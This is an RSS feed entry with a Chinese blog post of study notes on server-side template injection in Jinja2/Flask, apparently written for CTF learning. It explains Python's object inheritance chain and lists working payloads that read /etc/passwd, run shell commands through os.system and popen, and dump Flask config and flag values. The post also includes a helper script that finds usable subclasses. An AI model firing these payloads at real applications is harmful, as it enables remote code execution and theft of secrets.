<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SSTI on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/ssti/</link><description>Recent content in SSTI on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 08 Nov 2021 20:59:28 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/ssti/index.xml" rel="self" type="application/rss+xml"/><item><title>SSTI学习笔记</title><link>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</link><pubDate>Mon, 08 Nov 2021 20:59:28 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</guid><description>&lt;p>模板渲染可以借助代码构造（如条件、循环语句等）十分方便的动态呈现内容，但如果编写不当容易被攻击者注入恶意内容从而暴露上下文数据，甚至在服务器上运行执行任意命令的表达式&lt;/p>
&lt;h1 id="jinja">Jinja&lt;/h1>
&lt;p>Jinja2是一种面向Python的现代和设计友好的模板语言，以Django的模板为模型，是Flask框架的一部分&lt;/p>
&lt;p>Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用&lt;u>过滤器&lt;/u>修改变量，过滤器名添加在变量名之后，中间使用竖线分隔（这很有利于我们构造恶意的payload），比如这样的模板可以用首字母大写形式显示变量name的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">Hello, {{name|capitalize}}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Jinjia2也支持控制语句，比如这是一个常见的&lt;u>for语句&lt;/u>的渲染情况&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% for comment in comments %}
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>{{comment}}&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% endfor %}
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>之所以有模板渲染的漏洞是因为在渲染传递进去的参数时模板可以直接访问Python的一些对象及方法，可以构造一个长长的继承链来执行一些操作，比如文件读写&amp;amp;命令执行&lt;/p>
&lt;ul>
&lt;li>&lt;code>__dict__&lt;/code>：保存类实例或对象实例的属性变量键值对字典&lt;/li>
&lt;li>&lt;code>__class__&lt;/code>：返回一个实例所属的类；python中的新式类（显示继承object对象的类）都有一个属性&lt;code>__class&lt;/code>用于获取当前实例对应的类&lt;/li>
&lt;li>&lt;code>__mro__&lt;/code>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析（即MRO - Method Resolution Order）&lt;/li>
&lt;li>&lt;code>__bases__&lt;/code>：以元组形式返回一个类直接所继承的类（可以理解为直接父类）&lt;/li>
&lt;li>&lt;code>__base__&lt;/code>：返回一个类直接所继承的类（单个）（相当于&lt;code>__bases__[0]&lt;/code>），和&lt;code>__mro__&lt;/code>都是用来寻找基类的&lt;/li>
&lt;li>&lt;code>__subclasses__&lt;/code>：以列表形式返回类的所有存活子类的引用（而非实例）；python中的类都继承自object，只要调用object类对象的&lt;code>__subclasses__()&lt;/code>方法就可以获取想要的子类&lt;/li>
&lt;li>&lt;code>__init__&lt;/code>：类的初始化方法&lt;/li>
&lt;li>&lt;code>__globals__&lt;/code>：对包含函数全局变量的字典的引用，可以进一步获取file, os等模块&lt;/li>
&lt;li>&lt;code>__builtin__&lt;/code>&amp;amp;&amp;amp;&lt;code>__builtins__&lt;/code>：返回不用导入模块可以直接运行一些函数，例如int()，list()等内建函数，查看的方法是&lt;code>dir(__builtins__)&lt;/code>　　
&lt;ul>
&lt;li>在py2中&lt;code>__builtins__&lt;/code>模块是解释器自动创建的对于&lt;code>__builtin__&lt;/code>模块的引用，并非&lt;code>__buitin__&lt;/code>本身（在主模块中时，情况类似我们创建一个变量并对它做一次引用传递，两者是一样的，指向相同；当不是主模块 而是我们创建的一个可以被导入的模块时，&lt;code>__builtins__&lt;/code>其实是对&lt;code>__builtin__.__dict__&lt;/code>模块的引用）&lt;/li>
&lt;li>在py3中&lt;code>__builtin__&lt;/code>被命名为&lt;code>builtins&lt;/code>&lt;/li>
&lt;li>参考：&lt;a href="https://blog.51cto.com/xpleaf/1764849">深入理解Python中的&lt;code>__builtin__&lt;/code>和&lt;code>__builtins__&lt;/code>&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> 与 &lt;code>__builtin__&lt;/code>（builtins）&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="构造的原理">构造的原理&lt;/h2>
&lt;p>一言以蔽之：通过一个长长的调用继承链来将内建的函数或模块揪出来用&lt;/p>
&lt;h3 id="step1---找到基类object">step1 - 找到基类object&lt;/h3>
&lt;p>通过字符串、字典、列表、元组和很特殊的request来获取基类object，mro和bases[0]均可（或者是base 一样的效果，不一一列举）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108104543559.png" alt="image-20211108104543559">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py3&lt;/span>
&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step2---获得能用的子类">step2 - 获得“能用的”子类&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>会以列表形式返回object基类下的所有子类，我们需要的是其中含有&lt;code>os&lt;/code>, &lt;code>file&lt;/code>, &lt;code>__builtins__&lt;/code>模块的子类；这里给出一个脚本，可以单独寻找特定子类，也可以根据想要的模块找到对应的子类，返回索引位置&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2 &amp;amp; py3&lt;/span>
&lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;warnings.WarningMessage&amp;#34;&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>
&lt;span style="color:#111">raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">raw&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[*] &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> - &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">keys&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108115828170.png" alt="image-20211108115828170">到这一步可以得到的&lt;/p>
&lt;p>到这一步，我们的payload已经构造好一半了（以下index均指我们需要的subclass的索引位置）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step3---调用相关函数进行rce">step3 - 调用相关函数进行rce&lt;/h3>
&lt;h4 id="py2---fileoslinecache">py2 - file&amp;amp;os&amp;amp;linecache&lt;/h4>
&lt;p>&lt;code>&amp;lt;type 'file'&amp;gt;&lt;/code>是py2的专属，直接可以用&lt;code>read()&lt;/code>, &lt;code>write()&lt;/code>, &lt;code>readlines()&lt;/code>进行文件读写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>os&lt;/code>模块就不必说了，有&lt;code>system()&lt;/code>可以直接rce的函数；在py2中这两个子类可以直接用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site._Printer&amp;#39;&amp;gt;, 71&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site.Quitter&amp;#39;&amp;gt;, 76&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;FLAG]}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不嫌麻烦的还可以再套一层，用&lt;code>linecache&lt;/code>来调用&lt;code>os&lt;/code>，py2中有这两个类含有&lt;code>linecache&lt;/code>模块&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, 58&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;, 59&lt;/span>
&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;linecache&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="py3---__builtins__">py3 - __builtins__&lt;/h4>
&lt;p>py3中就没这么直接，要关注的模块是&lt;code>__builtins__&lt;/code>，借助它来调用内置的&lt;code>open()&lt;/code>进行文件读写，用&lt;code>eval()&lt;/code>将&lt;code>os&lt;/code>模块引入rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;whoami&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;open&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者是直接用&lt;code>__import__&lt;/code>加载&lt;code>os&lt;/code>模块执行命令&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>py2有个特殊的&lt;code>commands&lt;/code>模块也可以直接rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;commands&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getstatusoutput&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>——————注意引用&lt;code>__builtins__&lt;/code>内建模块这一方式在py2&amp;amp;py3完全通杀&lt;/p>
&lt;h2 id="常用payload">常用payload&lt;/h2>
&lt;p>其实上面已经列举的比较全啦，这里做一些小小的补充&lt;/p>
&lt;h3 id="for语句确定索引位置">for语句确定索引位置&lt;/h3>
&lt;p>前面提到过一点，我们需要的子类在python不同版本中位置并不固定（主要是py3 py2的基本固定死了），针对这个问题可以用Jinja支持的for语句来解决，submodule的名字可以用上面的脚本跑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;filename&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;) }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="特殊的一些对象">特殊的一些对象&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{config}}
{{config.items()}}
{{config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{url_for.__globals__[&amp;#39;__builtins__&amp;#39;].__import__(&amp;#39;os&amp;#39;).system(&amp;#39;ls&amp;#39;)}}
{{url_for.__globals__[&amp;#39;current_app&amp;#39;].config.FLAG}}
